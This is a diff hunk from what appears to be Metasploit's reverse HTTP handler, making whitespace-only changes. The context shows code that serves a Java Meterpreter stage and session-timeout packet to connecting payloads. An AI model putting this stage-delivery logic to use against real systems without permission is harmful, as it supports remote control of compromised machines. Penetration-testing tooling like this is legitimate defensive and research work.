@@ -125,24 +125,24 @@ protected
 
 
 		lhost = datastore['LHOST']
-		
-		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance) 
+
+		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance)
 		if lhost.empty? or lhost == '0.0.0.0'
 			lhost = Rex::Socket.source_address(cli.peerhost)
 		end
-		
+
 		# Process the requested resource.
 		case req.relative_resource
 			when /^\/INITJM/
 				print_line("Java: #{req.relative_resource}")
-			
+
 				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
-				url = "http://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"				
+				url = "http://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
 				print_line "URL: #{url.inspect}"
-				
+
 				blob = ""
 				blob << obj.generate_stage
-				
+
 				# This is a TLV packet - I guess somewhere there should be API for building them
 				# in Metasploit :-)
 				packet = ""
@@ -151,7 +151,7 @@ protected
 				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
 				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
 				blob << [packet.length+8, 0].pack('NN') + packet
-				
+
 				resp.body = blob
 				conn_ids << conn_id
 
@@ -164,7 +164,7 @@ protected
 					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
 					:ssl                => false
 				})
-				
+
 			when /^\/A?INITM?/
 				print_line("Win32: #{req.relative_resource}")
 
